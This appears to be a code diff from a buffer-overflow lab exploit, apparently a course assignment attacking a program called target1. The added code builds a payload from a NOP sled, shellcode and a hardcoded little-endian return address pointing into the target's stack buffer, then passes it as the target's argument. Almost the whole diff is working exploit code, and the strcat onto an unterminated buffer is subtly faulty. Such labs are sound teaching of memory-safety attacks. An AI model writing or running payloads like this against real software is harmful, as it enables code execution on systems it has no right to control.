@@ -13,7 +13,28 @@ main ( int argc, char * argv[] )
 	char *	env[1];
 
 	args[0] = TARGET;
-	args[1] = "hi there";
+
+	char sploit_str[128];
+	int sploit_len = 128;
+
+	// target1 &buf is located at 0x2021fe50 to 0x2021feb0 (96 = 0x60)
+	// Little Endian format
+	char target_addr[] = "\x50\xfe\x21\x20";
+
+	// Fill head with NOP
+	// Offset 4 for the target buffer address
+	for (int i = 0; i < (sploit_len - shellcode_len - 4); ++i)
+	{
+		sploit_str[i] = nop;
+	}
+
+	// Append the shellcode
+	strcat(sploit_str, shellcode);
+
+	// Append the target buffer address
+	strcat(sploit_str, target_addr);
+
+	args[1] = sploit_str;
 	args[2] = NULL;
 
 	env[0] = NULL;
